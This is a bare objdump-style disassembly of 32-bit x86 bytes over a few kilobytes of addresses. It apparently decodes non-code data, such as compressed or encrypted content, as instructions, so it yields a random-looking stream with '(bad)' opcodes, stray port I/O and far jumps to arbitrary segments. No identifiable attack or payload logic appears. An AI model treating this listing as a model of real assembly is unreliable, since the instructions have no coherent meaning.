  41c1bc:	mov    edx,0x2a542e01
  41c1c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c2:	inc    esi
  41c1c3:	fwait
  41c1c4:	es jae 0x41c1f6
  41c1c7:	dec    esp
  41c1c8:	test   eax,0xbc7b805a
  41c1cd:	xchg   edi,eax
  41c1ce:	stc    
  41c1cf:	xchg   dh,ch
  41c1d1:	inc    ebp
  41c1d2:	and    eax,0xe8040562
  41c1d7:	nop
  41c1d8:	inc    edx
  41c1d9:	adc    eax,0xe833d0c9
  41c1de:	pop    eax
  41c1df:	repnz int 0x4c
  41c1e2:	out    0xef,eax
  41c1e4:	enter  0xe969,0xc1
  41c1e8:	inc    esi
  41c1e9:	dec    ebp
  41c1ea:	sbb    al,0xdf
  41c1ec:	add    ch,BYTE PTR [esi-0x2a]
  41c1ef:	adc    esp,DWORD PTR [esp+ecx*4+0x58ce4967]
  41c1f6:	add    edx,ecx
  41c1f8:	std    
  41c1f9:	push   ecx
  41c1fa:	add    BYTE PTR [eax-0x574bcd50],al
  41c200:	adc    al,0xda
  41c202:	cmp    ch,BYTE PTR [ecx+0x71]
  41c205:	pushf  
  41c206:	sbb    DWORD PTR [eax-0x3c81d8da],esi
  41c20c:	add    BYTE PTR [esi+0x4f],ah
  41c20f:	in     eax,0x35
  41c211:	adc    ch,BYTE PTR [edi-0x43106a34]
  41c217:	sahf   
  41c218:	cli    
  41c219:	xor    ebp,eax
  41c21b:	jbe    0x41c257
  41c21d:	add    BYTE PTR [edi],dh
  41c21f:	pop    eax
  41c220:	and    ah,BYTE PTR [edi+0x375b7695]
  41c226:	lahf   
  41c227:	shl    BYTE PTR [edx+0x245416f0],1
  41c22d:	test   al,0xec
  41c22f:	dec    DWORD PTR [esi+ecx*2-0x3f]
  41c233:	push   cs
  41c234:	pop    ds
  41c235:	mov    edx,0x4f8f8a81
  41c23a:	inc    eax
  41c23b:	lods   eax,DWORD PTR fs:[esi]
  41c23d:	lahf   
  41c23e:	js     0x41c2ac
  41c240:	push   ss
  41c241:	xor    DWORD PTR [eax+0xf],esi
  41c244:	retf   0x88c2
  41c247:	mov    ds:0x72f172a4,eax
  41c24c:	outs   dx,BYTE PTR ds:[esi]
  41c24d:	xor    DWORD PTR [ebx+0xf],0x77
  41c251:	cs sahf 
  41c253:	lea    edi,[ebp-0x49ffec7d]
  41c259:	es inc edi
  41c25b:	inc    esp
  41c25c:	cmp    DWORD PTR fs:0xc1cdde94,esp
  41c263:	aas    
  41c264:	push   ss
  41c265:	das    
  41c266:	xchg   esi,eax
  41c267:	sub    al,BYTE PTR [eax]
  41c269:	clc    
  41c26a:	push   ss
  41c26b:	pusha  
  41c26c:	xchg   ebx,eax
  41c26d:	stos   DWORD PTR es:[edi],eax
  41c26e:	push   ebp
  41c26f:	lfs    edx,FWORD PTR [esi-0x14]
  41c273:	in     al,dx
  41c274:	in     al,0x30
  41c276:	jno    0x41c25d
  41c278:	sub    BYTE PTR ds:0xf3551f92,ah
  41c27e:	sti    
  41c27f:	lsl    edx,WORD PTR [esp+eiz*8-0x8]
  41c284:	push   es
  41c285:	push   eax
  41c286:	jmp    0xa068b431
  41c28b:	lahf   
  41c28c:	push   esi
  41c28d:	or     bh,BYTE PTR [edx-0xb]
  41c290:	add    eax,0x0
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	mov    ecx,0x949a00a0
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR ds:0x77000001,al
  41c30d:	xchg   edx,eax
  41c30e:	pop    ds
  41c30f:	jo     0x41c292
  41c311:	retf   
  41c312:	jne    0x41c326
  41c314:	jne    0x41c32f
  41c316:	mov    bh,0xbd
  41c318:	pop    esi
  41c319:	dec    eax
  41c31a:	xchg   al,al
  41c31c:	jle    0x41c31f
  41c31e:	jmp    0xba26:0x7a48eb78
  41c325:	mov    ah,0x37
  41c327:	lods   eax,DWORD PTR ds:[esi]
  41c328:	mov    BYTE PTR [esi+0x7c],bl
  41c32b:	push   esp
  41c32c:	shl    DWORD PTR [ebp-0x33],0x12
  41c330:	jl     0x41c3a7
  41c332:	mov    ecx,DWORD PTR [edx]
  41c334:	and    BYTE PTR [eax-0x3df71e02],cl
  41c33a:	push   0x13
  41c33c:	xlat   BYTE PTR ds:[ebx]
  41c33d:	inc    ebp
  41c33e:	arpl   WORD PTR [eax+0x72884330],si
  41c344:	test   BYTE PTR [ebx],0xa9
  41c347:	mov    bl,0xff
  41c349:	sbb    edi,0xffffffc3
  41c34c:	shr    DWORD PTR [ecx],cl
  41c34e:	sub    BYTE PTR [edx-0x7d],al
  41c351:	xchg   DWORD PTR [edi-0x50],edx
  41c354:	hlt    
  41c355:	xchg   edx,eax
  41c356:	cmp    ch,bl
  41c358:	fcomp  QWORD PTR [ebp+0x28]
  41c35b:	or     ch,BYTE PTR ds:0x7e2fa46f
  41c361:	xor    edx,DWORD PTR [edx-0x7e]
  41c364:	push   esi
  41c365:	inc    ecx
  41c366:	(bad)  
  41c368:	ins    BYTE PTR es:[edi],dx
  41c369:	and    al,BYTE PTR [edi-0x65]
  41c36c:	add    dl,cl
  41c36e:	mov    DWORD PTR [esi+0x7f0ac34d],edi
  41c374:	scas   eax,DWORD PTR es:[edi]
  41c375:	shl    DWORD PTR [ecx-0x7797ecd4],cl
  41c37b:	ins    BYTE PTR es:[edi],dx
  41c37c:	dec    eax
  41c37d:	cmp    esi,eax
  41c37f:	push   ebx
  41c380:	add    eax,DWORD PTR [ecx+0x49b591d5]
  41c386:	jb     0x41c331
  41c388:	pop    eax
  41c389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c38a:	and    al,cl
  41c38c:	jnp    0x41c3d6
  41c38e:	pop    ecx
  41c38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c390:	ss jae 0x41c388
  41c393:	and    eax,0x316d0703
  41c398:	mov    al,ds:0xe52e3f8b
  41c39d:	cs aaa 
  41c39f:	mov    esi,0x8d44c18b
  41c3a4:	mov    bl,0xc8
  41c3a6:	pop    ds
  41c3a7:	ror    bl,0x3c
  41c3aa:	pop    edx
  41c3ab:	pop    ss
  41c3ac:	dec    edi
  41c3ad:	into   
  41c3ae:	jns    0x41c332
  41c3b0:	pop    ebp
  41c3b1:	mov    BYTE PTR [eax-0x30],ch
  41c3b4:	adc    DWORD PTR [eax-0x16],esp
  41c3b7:	mov    cl,0x1e
  41c3b9:	sahf   
  41c3ba:	popf   
  41c3bb:	(bad)  
  41c3bc:	xchg   edx,eax
  41c3bd:	js     0x41c3d4
  41c3bf:	xchg   ebx,eax
  41c3c0:	and    eax,0x7d01ba94
  41c3c5:	sub    eax,0xf4f7ba4a
  41c3ca:	sub    eax,0x20d8eba
  41c3cf:	mov    fs,WORD PTR [edx-0x51]
  41c3d2:	hlt    
  41c3d3:	or     DWORD PTR [esi+0x9],eax
  41c3d6:	xchg   ecx,eax
  41c3d7:	scas   eax,DWORD PTR es:[edi]
  41c3d8:	sub    eax,0xf9aa13b
  41c3dd:	neg    BYTE PTR [ebx+0x4aebdf3e]
  41c3e3:	mov    edx,0xdae1dbb
  41c3e8:	ins    DWORD PTR es:[edi],dx
  41c3e9:	retf   
  41c3ea:	sub    eax,ebp
  41c3ec:	add    ebp,ebx
  41c3ee:	or     eax,eax
  41c3f0:	addr16 xadd cl,al
  41c3f4:	adc    al,0xc8
  41c3f6:	repnz sub BYTE PTR [edx-0x2fe10502],0x5
  41c3fe:	mov    ch,0x2e
  41c400:	cs sti 
  41c402:	xchg   ebp,eax
  41c403:	mov    bl,0x4a
  41c405:	xor    DWORD PTR gs:[edi],esp
  41c408:	nop
  41c409:	lods   eax,DWORD PTR ds:[esi]
  41c40a:	imul   ebx,ebx,0x918e0f5f
  41c410:	push   0x0
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	ror    DWORD PTR [edi+eax*2+0x12c99a5],cl
  41c487:	add    BYTE PTR ds:0xe0000001,al
  41c48d:	pop    esp
  41c48e:	mov    edx,0xa77ca08
  41c493:	xchg   edi,eax
  41c494:	push   0x852c9be5
  41c499:	(bad)  
  41c49a:	pop    eax
  41c49b:	xchg   ebp,eax
  41c49c:	clc    
  41c49d:	mov    edi,0xe181f7e4
  41c4a2:	in     eax,0x31
  41c4a4:	xor    dl,dl
  41c4a6:	dec    ebp
  41c4a7:	jae    0x41c491
  41c4a9:	scas   al,BYTE PTR es:[edi]
  41c4aa:	test   BYTE PTR [ecx],ah
  41c4ac:	daa    
  41c4ad:	out    0x45,eax
  41c4af:	pop    ebx
  41c4b0:	jecxz  0x41c519
  41c4b2:	mov    BYTE PTR [ecx-0x6b],0xa3
  41c4b6:	xor    al,0xcf
  41c4b8:	mov    dh,0xf8
  41c4ba:	out    0xcc,al
  41c4bc:	push   esp
  41c4bd:	dec    eax
  41c4be:	mov    al,ds:0xd03e19d3
  41c4c3:	sahf   
  41c4c4:	popa   
  41c4c5:	pop    edi
  41c4c6:	sub    DWORD PTR [ecx+0x47ddf698],0xdd6e9339
  41c4d0:	push   cs
  41c4d1:	jno    0x41c4ca
  41c4d3:	sub    dh,dl
  41c4d5:	mov    edx,0xcd5b94d4
  41c4da:	test   DWORD PTR [ecx-0x3f],esp
  41c4dd:	sbb    ecx,DWORD PTR ds:0x40e2cf29
  41c4e3:	ins    DWORD PTR es:[edi],dx
  41c4e4:	fidiv  DWORD PTR [eax-0x2f]
  41c4e7:	je     0x41c4f4
  41c4e9:	mov    edx,0xd28e8504
  41c4ee:	xchg   ebp,eax
  41c4ef:	in     eax,0xe3
  41c4f1:	mov    BYTE PTR [ecx+0x7e],bl
  41c4f4:	aam    0x5e
  41c4f6:	retf   0xde5d
  41c4f9:	dec    ecx
  41c4fa:	in     eax,0xb9
  41c4fc:	adc    esp,edx
  41c4fe:	pop    eax
  41c4ff:	xchg   DWORD PTR [edi],ecx
  41c501:	clc    
  41c502:	into   
  41c503:	adc    eax,0x98e3872f
  41c508:	imul   esp,DWORD PTR es:[esi+0x46],0x7d42e12c
  41c510:	into   
  41c511:	ja     0x41c56b
  41c513:	sub    BYTE PTR [ebp-0x233874b7],ch
  41c519:	or     DWORD PTR [edx],ecx
  41c51b:	data16 fcmovne st,st(6)
  41c51e:	rcr    DWORD PTR [eax],cl
  41c520:	xor    esp,ebp
  41c522:	and    bh,BYTE PTR [ebx-0x44]
  41c525:	inc    esp
  41c526:	(bad)  
  41c527:	retf   
  41c528:	cmc    
  41c529:	lods   eax,DWORD PTR ds:[esi]
  41c52a:	(bad)  
  41c52b:	sub    bh,BYTE PTR ds:0x4fb31ced
  41c531:	xor    bh,ah
  41c533:	stos   BYTE PTR es:[edi],al
  41c534:	loop   0x41c574
  41c536:	or     esp,eax
  41c538:	out    0x89,eax
  41c53a:	mov    ebx,0xba0204f9
  41c53f:	xchg   ebp,eax
  41c540:	(bad)  
  41c541:	xor    BYTE PTR [edx-0x5b609173],0x8f
  41c548:	stos   DWORD PTR es:[edi],eax
  41c549:	add    eax,0x97182de3
  41c54e:	lods   al,BYTE PTR ds:[esi]
  41c54f:	sbb    al,0x64
  41c551:	aam    0x9c
  41c553:	je     0x41c59e
  41c555:	les    edi,FWORD PTR [eax+0x58c9ad8f]
  41c55b:	nop
  41c55c:	mov    eax,ds:0x9281faa8
  41c561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c562:	cs xchg edx,eax
  41c564:	add    BYTE PTR [eax+0x6a],ch
  41c567:	cwde   
  41c568:	ja     0x41c514
  41c56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c56b:	leave  
  41c56c:	push   edi
  41c56d:	test   DWORD PTR [ebp+0x68ecda65],eax
  41c573:	mov    dl,BYTE PTR [eax+0x4210eb1c]
  41c579:	mov    eax,0x521bc3b7
  41c57e:	dec    cx
  41c580:	fcmovu st,st(6)
  41c582:	popa   
  41c583:	jb     0x41c551
  41c585:	stos   DWORD PTR es:[edi],eax
  41c586:	sub    al,0xea
  41c588:	mov    cl,0x1d
  41c58a:	dec    edi
  41c58b:	icebp  
  41c58c:	mov    bl,0x4e
  41c58e:	neg    DWORD PTR [edi+0x17]
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0xe0293ee5
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x14000001
  41c60d:	xor    al,BYTE PTR [esi]
  41c60f:	sar    DWORD PTR [eax-0x17b2a82a],0x2a
  41c616:	cwde   
  41c617:	adc    eax,edi
  41c619:	pop    ds
  41c61a:	mov    ecx,0x9b7a85c7
  41c61f:	pop    esi
  41c620:	iret   
  41c621:	inc    edi
  41c622:	fisubr DWORD PTR [ebx-0x7f425163]
  41c628:	xor    BYTE PTR ds:0x3732070c,al
  41c62e:	(bad)  
  41c62f:	pop    es
  41c630:	lea    esp,[eax-0xf29c38c]
  41c636:	xor    al,0x42
  41c638:	dec    edi
  41c639:	xor    DWORD PTR [ebp-0x2b],ebp
  41c63c:	jmp    0xfaa3:0x183798c5
  41c643:	mov    DWORD PTR fs:[ebp+0x6e27168a],eax
  41c64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c64b:	adc    ebp,esi
  41c64d:	or     bl,dl
  41c64f:	cwde   
  41c650:	mov    edi,DWORD PTR [ebx+eax*8-0x10e05491]
  41c657:	(bad)
  41c65a:	xlat   BYTE PTR ds:[ebx]
  41c65b:	sti    
  41c65c:	lods   eax,DWORD PTR ds:[esi]
  41c65d:	mov    esp,0xbbd08b70
  41c662:	mov    esi,0x9defdd1b
  41c667:	pop    ds
  41c668:	stos   DWORD PTR es:[edi],eax
  41c669:	lfs    ecx,FWORD PTR [edx]
  41c66c:	pop    eax
  41c66d:	sub    ebx,DWORD PTR [esi]
  41c66f:	jl     0x41c680
  41c671:	jmp    0x4d80e9d
  41c676:	imul   eax,esp,0xb
  41c679:	in     eax,dx
  41c67a:	ror    DWORD PTR [edx],1
  41c67c:	fisub  DWORD PTR [esi+0x61508ef1]
  41c682:	lock xchg DWORD PTR cs:[edi+esi*2],edi
  41c687:	mov    dh,0xb
  41c689:	xor    ebx,edx
  41c68b:	or     DWORD PTR [ebx],ebp
  41c68d:	arpl   WORD PTR [edi-0x59d631fc],sp
  41c693:	(bad)  
  41c694:	test   al,0xbe
  41c696:	dec    ecx
  41c697:	cli    
  41c698:	pushf  
  41c699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c69a:	mov    dh,0x69
  41c69c:	adc    BYTE PTR [ebp-0x7b],al
  41c69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6a0:	into   
  41c6a1:	stc    
  41c6a2:	dec    edx
  41c6a3:	(bad)  
  41c6a4:	cmp    esp,DWORD PTR [edi-0x7f]
  41c6a7:	sub    eax,0xa31f1ca
  41c6ac:	sub    DWORD PTR [eax-0x355d3249],eax
  41c6b2:	in     eax,dx
  41c6b3:	stc    
  41c6b4:	mov    WORD PTR [ebx+eiz*4],?
  41c6b7:	sar    BYTE PTR [ecx-0x18],1
  41c6ba:	and    cl,BYTE PTR [esi]
  41c6bc:	pop    ss
  41c6bd:	mov    esp,0x7f73b35c
  41c6c2:	jnp    0x41c660
  41c6c4:	mov    es,WORD PTR [eax+0x538862ee]
  41c6ca:	fmul   DWORD PTR [ebx-0x726f45e]
  41c6d0:	mov    al,0x1e
  41c6d2:	jmp    0xa852:0x733edc55
  41c6d9:	test   al,0xe5
  41c6db:	mov    edi,0xfcee56a2
  41c6e0:	xchg   esp,eax
  41c6e1:	mov    edx,DWORD PTR [ecx-0x7]
  41c6e4:	leave  
  41c6e5:	dec    eax
  41c6e6:	in     eax,dx
  41c6e7:	xor    BYTE PTR [edx+0x4b],al
  41c6ea:	cmp    esi,edx
  41c6ec:	leave  
  41c6ed:	xor    eax,0x272b789
  41c6f2:	dec    edx
  41c6f3:	in     eax,dx
  41c6f4:	scas   al,BYTE PTR es:[edi]
  41c6f5:	inc    edx
  41c6f6:	adc    edi,ebx
  41c6f8:	rcr    DWORD PTR [edx-0x15],0xae
  41c6fc:	shl    DWORD PTR [esi-0x73],1
  41c6ff:	pop    esi
  41c700:	adc    dl,BYTE PTR [ebp+0x6b]
  41c703:	div    DWORD PTR [ecx+0x61]
  41c706:	pusha  
  41c707:	call   0x9abe:0xaa6a39ad
  41c70e:	push   esp
  41c70f:	repnz cmc 
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	push   es
  41c781:	mov    ch,0x77
  41c783:	mov    WORD PTR [ebx+0x500012e],fs
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    BYTE PTR ds:0x11395b42,bl
  41c791:	xchg   ebp,eax
  41c792:	add    dh,BYTE PTR [esi+0x24be3606]
  41c798:	dec    ecx
  41c799:	pushf  
  41c79a:	icebp  
  41c79b:	ins    BYTE PTR es:[edi],dx
  41c79c:	and    BYTE PTR [eax+0x23eece6f],0x33
  41c7a3:	mov    ebp,0xd2b35a1b
  41c7a8:	fwait
  41c7a9:	loopne 0x41c72e
  41c7ab:	jno    0x41c7b3
  41c7ad:	jno    0x41c7df
  41c7af:	jno    0x41c7f7
  41c7b1:	jecxz  0x41c785
  41c7b3:	(bad)  
  41c7b4:	mov    eax,ds:0xed8a0fb7
  41c7b9:	add    cl,BYTE PTR [ebx+0x10]
  41c7bc:	fisttp QWORD PTR [esi]
  41c7be:	mov    ds:0xd7f76164,eax
  41c7c3:	or     edx,esp
  41c7c5:	sbb    BYTE PTR [esi+ebx*4],0xca
  41c7c9:	(bad)  
  41c7ca:	dec    esi
  41c7cb:	and    eax,0xf5148577
  41c7d0:	loope  0x41c80d
  41c7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7d3:	sahf   
  41c7d4:	dec    edx
  41c7d5:	xchg   edx,eax
  41c7d6:	adc    al,0xb
  41c7d8:	push   ebx
  41c7d9:	aas    
  41c7da:	fadd   DWORD PTR [eax+ebx*4-0x8b9570b]
  41c7e1:	cmp    esp,DWORD PTR ds:0x8dc3dcf8
  41c7e7:	mov    ch,0x14
  41c7e9:	retf   
  41c7ea:	rcr    DWORD PTR [ebx],0x3a
  41c7ed:	inc    edx
  41c7ee:	sbb    BYTE PTR [esi],al
  41c7f0:	shl    BYTE PTR [ebx],cl
  41c7f2:	cmp    BYTE PTR ds:0x65fbdb0c,dl
  41c7f8:	cld    
  41c7f9:	pop    edx
  41c7fa:	into   
  41c7fb:	adc    eax,0xfc49d8ca
  41c800:	sub    ebx,DWORD PTR [ebp+0x7a32f93b]
  41c806:	lds    ebp,FWORD PTR [ebx+ecx*4+0x2d]
  41c80a:	cmp    BYTE PTR [ecx-0x7306efca],0x40
  41c811:	xor    DWORD PTR [ecx+0x6ad6f62a],0x1ec35390
  41c81b:	inc    esp
  41c81c:	adc    DWORD PTR [edi+0x5b4dd3a6],eax
  41c822:	adc    BYTE PTR [ebx+0x62],al
  41c825:	pop    ebx
  41c826:	sbb    BYTE PTR [eiz*8+0x2deab971],bl
  41c82d:	imul   esp,DWORD PTR [edi],0x52
  41c830:	sub    al,0x5e
  41c832:	sub    esi,ebp
  41c834:	cmp    al,0xc0
  41c836:	sbb    bl,ch
  41c838:	cmp    eax,0xfa112475
  41c83d:	sbb    eax,0x722adf01
  41c842:	mov    WORD PTR [eax+0x33c2081f],ds
  41c848:	cld    
  41c849:	aaa    
  41c84a:	mov    edi,0x42c0bb9c
  41c84f:	add    dh,BYTE PTR [ecx]
  41c851:	les    ecx,FWORD PTR [edx+0x7df48142]
  41c857:	push   eax
  41c858:	sbb    BYTE PTR [eax],ch
  41c85a:	mov    edi,0x12bd98f2
  41c85f:	or     DWORD PTR [edi],eax
  41c861:	inc    edi
  41c862:	out    dx,eax
  41c863:	xchg   edi,eax
  41c864:	ins    BYTE PTR es:[edi],dx
  41c865:	xor    edx,edx
  41c867:	mov    dl,0x97
  41c869:	push   eax
  41c86a:	js     0x41c8ea
  41c86c:	ins    BYTE PTR es:[edi],dx
  41c86d:	xchg   edx,eax
  41c86e:	icebp  
  41c86f:	cmp    esp,esi
  41c871:	ja     0x41c85e
  41c873:	mov    ebx,0x4d0761dc
  41c878:	stc    
  41c879:	and    eax,0x615de6ef
  41c87e:	mov    eax,0x7adc8824
  41c883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c884:	outs   dx,BYTE PTR cs:[esi]
  41c886:	outs   dx,DWORD PTR ds:[esi]
  41c887:	and    ch,BYTE PTR [eax-0x76]
  41c88a:	shr    DWORD PTR [ecx-0x60],0x8c
  41c88e:	imul   ecx,DWORD PTR [ebp-0x6a],0x0
	...
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [ebx-0x571da130],ebx
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0xfd000001
  41c90d:	adc    esi,ebx
  41c90f:	jg     0x41c8b1
  41c911:	adc    BYTE PTR [ebx-0x7a],ch
  41c914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c915:	adc    eax,0xc73857a1
  41c91a:	push   0x8414f746
  41c91f:	mov    edi,0x20389954
  41c924:	jo     0x41c960
  41c926:	pop    esi
  41c927:	push   eax
  41c928:	sub    cl,BYTE PTR [edx+0x23a4a5e5]
  41c92e:	jo     0x41c99c
  41c930:	out    dx,al
  41c931:	int3   
  41c932:	std    
  41c933:	mov    cl,dh
  41c935:	clc    
  41c936:	lods   al,BYTE PTR ds:[esi]
  41c937:	sbb    al,bl
  41c939:	push   eax
  41c93a:	fisttp DWORD PTR [edx]
  41c93c:	arpl   WORD PTR [esi],bx
  41c93e:	sbb    DWORD PTR [ebp-0x68],edx
  41c941:	dec    esp
  41c942:	or     al,0x8b
  41c944:	fidivr WORD PTR [eax-0x1]
  41c947:	sahf   
  41c948:	aaa    
  41c949:	hlt    
  41c94a:	mov    edx,0x755f96b
  41c94f:	mov    eax,ds:0x8cfc08d6
  41c954:	push   0xffffff94
  41c956:	not    DWORD PTR [ecx+esi*8+0x217e2375]
  41c95d:	fwait
  41c95e:	jae    0x41c8e4
  41c960:	adc    eax,0x559024cc
  41c965:	shl    DWORD PTR [ebx+edx*4],1
  41c968:	popa   
  41c969:	stos   DWORD PTR es:[edi],eax
  41c96a:	mov    edi,0x2127a0ab
  41c96f:	cmp    eax,0x4872d55a
  41c974:	inc    ebp
  41c975:	mov    al,0x3b
  41c977:	add    edx,esi
  41c979:	out    0xba,eax
  41c97b:	sahf   
  41c97c:	mov    ds:0x2b475b19,al
  41c981:	mov    dh,BYTE PTR [esp+eax*8]
  41c984:	mov    al,0x23
  41c986:	xchg   BYTE PTR [esi+0x15],cl
  41c989:	scas   al,BYTE PTR es:[edi]
  41c98a:	out    dx,al
  41c98b:	popa   
  41c98c:	and    DWORD PTR ds:0x7e17b43a,ebp
  41c992:	mov    esi,0xebab97df
  41c997:	aas    
  41c998:	fcom   DWORD PTR [esi]
  41c99a:	jns    0x41c983
  41c99c:	popf   
  41c99d:	sahf   
  41c99e:	and    eax,DWORD PTR [ebp-0x476e1ff1]
  41c9a4:	or     esi,DWORD PTR [esp+eiz*4-0x1a931660]
  41c9ab:	sbb    eax,0xd3480c37
  41c9b0:	call   0xdef8:0xfab547e9
  41c9b7:	pop    eax
  41c9b8:	imul   esi,DWORD PTR [edi],0x3477a520
  41c9be:	test   al,0x5
  41c9c0:	ja     0x41c9a1
  41c9c2:	jmp    0xeee1:0xc98dbfca
  41c9c9:	pushf  
  41c9ca:	mov    ch,0x52
  41c9cc:	xchg   ecx,eax
  41c9cd:	mov    eax,ds:0xc0f9bcef
  41c9d2:	or     al,0xe7
  41c9d4:	cmp    BYTE PTR [ecx-0x5e],0x4f
  41c9d8:	sbb    ebx,DWORD PTR [ecx+0xe]
  41c9db:	jne    0x41c9e0
  41c9dd:	cmp    DWORD PTR [edx+eax*2+0x51],esi
  41c9e1:	out    dx,eax
  41c9e2:	cmp    DWORD PTR [ecx],0x12
  41c9e5:	sub    al,BYTE PTR [edi-0x7d2be564]
  41c9eb:	repz addr16 (bad) 
  41c9ef:	sar    DWORD PTR [esi-0x1b],1
  41c9f2:	cmp    eax,0xe4f5608
  41c9f7:	or     ebp,ebx
  41c9f9:	fist   DWORD PTR ds:0x79146703
  41ca00:	inc    edx
  41ca01:	jnp    0x41ca11
  41ca03:	sbb    eax,DWORD PTR cs:[esi]
  41ca06:	fistp  WORD PTR [edi-0x75]
  41ca09:	imul   eax,DWORD PTR [edi-0x2a],0xffffffd7
  41ca0d:	inc    eax
  41ca0e:	dec    esp
  41ca0f:	mov    cl,BYTE PTR [edx+0x0]
	...
  41ca72:	add    BYTE PTR [eax],al
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	mov    eax,ds:0xad4dcb3c
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0xc3000001,al
  41ca8d:	cmp    al,0xe8
  41ca8f:	daa    
  41ca90:	mov    BYTE PTR [edi],dh
  41ca92:	ror    BYTE PTR [eax],0xe2
  41ca95:	and    al,0x1c
  41ca97:	cmp    eax,0xb8eb9b30
  41ca9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca9d:	call   0xe76:0x1540971e
  41caa4:	enter  0x8484,0x27
  41caa8:	push   ecx
  41caa9:	ins    BYTE PTR es:[edi],dx
  41caaa:	ins    BYTE PTR es:[edi],dx
  41caab:	gs inc edx
  41caad:	and    BYTE PTR [eax],0xdc
  41cab0:	pop    ss
  41cab1:	lods   eax,DWORD PTR ds:[esi]
  41cab2:	aam    0x26
  41cab4:	push   ebx
  41cab5:	in     eax,dx
  41cab6:	jns    0x41ca93
  41cab8:	aad    0x3c
  41caba:	(bad)  
  41cabb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cabc:	adc    esp,DWORD PTR [ebp-0x36f7b0ea]
  41cac2:	faddp  st(5),st
  41cac4:	in     al,0x91
  41cac6:	dec    edx
  41cac7:	idiv   BYTE PTR [ecx+0x50211efa]
  41cacd:	int3   
  41cace:	adc    edx,esp
  41cad0:	cld    
  41cad1:	add    al,0x95
  41cad3:	adc    esp,esi
  41cad5:	mov    bh,0xf4
  41cad7:	mov    ah,BYTE PTR [ebx-0x4c]
  41cada:	mov    BYTE PTR [ecx],al
  41cadc:	sub    al,0x43
  41cade:	mov    WORD PTR ds:0x6317279,?
  41cae4:	sbb    dl,BYTE PTR [esi+0x52]
  41cae7:	popf   
  41cae8:	mov    BYTE PTR [esi+ebx*2],0xe3
  41caec:	mov    eax,ds:0x1a9ce281
  41caf1:	jmp    DWORD PTR [edi+0x1cd6ec1b]
  41caf7:	jnp    0x41cb58
  41caf9:	(bad)  
  41cafa:	retf   
  41cafb:	or     DWORD PTR [eax],ebp
  41cafd:	fnsave [edx+0x30]
  41cb00:	jae    0x41cb6e
  41cb02:	add    edx,DWORD PTR ds:0xdfdcbe26
  41cb08:	in     eax,0x11
  41cb0a:	add    ebp,DWORD PTR [edx-0x14285182]
  41cb10:	or     bl,ah
  41cb12:	ins    DWORD PTR es:[edi],dx
  41cb13:	aam    0xdc
  41cb15:	inc    ecx
  41cb16:	pushf  
  41cb17:	stc    
  41cb18:	cwde   
  41cb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb1a:	sub    DWORD PTR [edi],edi
  41cb1c:	or     al,0x49
  41cb1e:	dec    ebp
  41cb1f:	push   edi
  41cb20:	jle    0x41cad8
  41cb22:	mov    bl,0x5b
  41cb24:	jmp    0xee5a1eb1
  41cb29:	jg     0x41cb70
  41cb2b:	jns    0x41cb4a
  41cb2d:	mov    al,ds:0x1c76176a
  41cb32:	in     eax,dx
  41cb33:	std    
  41cb34:	jno    0x41cba2
  41cb36:	mov    ds:0x2b97d95,al
  41cb3b:	jmp    0x41cb6b
  41cb3d:	and    eax,0x992d315c
  41cb42:	cwde   
  41cb43:	call   0xbd396b54
  41cb48:	cwde   
  41cb49:	push   edx
  41cb4a:	sbb    BYTE PTR [ebx+edi*4],ch
  41cb4d:	jnp    0x41caef
  41cb4f:	pop    ds
  41cb50:	stos   BYTE PTR es:[edi],al
  41cb51:	leave  
  41cb52:	add    DWORD PTR fs:[edx],ecx
  41cb55:	inc    ecx
  41cb56:	or     BYTE PTR [eax+0x64],bh
  41cb59:	in     al,0xe0
  41cb5b:	ds mov bl,0xd2
  41cb5e:	jecxz  0x41cb76
  41cb60:	dec    ebp
  41cb61:	dec    edi
  41cb62:	in     al,0xff
  41cb64:	addr16 jbe 0x41cb15
  41cb67:	dec    edi
